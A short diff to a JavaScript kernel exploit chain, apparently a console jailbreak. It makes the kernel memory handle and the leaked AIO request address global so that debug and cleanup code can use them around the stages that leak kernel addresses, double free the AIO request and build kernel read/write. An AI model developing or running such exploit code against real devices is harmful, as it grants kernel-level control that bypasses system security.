@@ -43,7 +43,7 @@ import * as config from './config.mjs';
 const t1 = performance.now();
 
 
-let kmem, reqs1_addr, p_ucred;
+let kmem2, reqs1_addr2, p_ucred;
 let pktopts_sds, dirty_sd;
 let kbase, kernel_addr, restore_info;
 let sds = []
@@ -1696,11 +1696,11 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
    log('__________________TEST________________________');
     
    
-  debug_aio_memory_state(kmem, reqs1_addr, "AIO – prima della pulizia");
+  debug_aio_memory_state(kmem2, reqs1_addr2, "AIO – prima della pulizia");
 
-            zero_out_aio(kmem, reqs1_addr);
+            zero_out_aio(kmem2, reqs1_addr2);
 
-         debug_aio_memory_state(kmem, reqs1_addr, "AIO – dopo la pulizia");
+         debug_aio_memory_state(kmem2, reqs1_addr2, "AIO – dopo la pulizia");
         
             log('__________________TEST________________________');
 
@@ -1853,6 +1853,10 @@ export async function kexploit() {
             reqs1_addr, kbuf_addr, kernel_addr, target_id, evf,
         ] = leak_kernel_addrs(sd_pair);
 
+
+      reqs1_addr2=reqs1_addr;
+
+        
         log('\nSTAGE: Double free SceKernelAioRWRequest');
         const [pktopts_sds, dirty_sd] = double_free_reqs1(
             reqs1_addr, kbuf_addr, target_id, evf, sd_pair[0], sds,
@@ -1862,7 +1866,8 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
         
-         
+         kmem2 = kmem;
+    
 
 
         
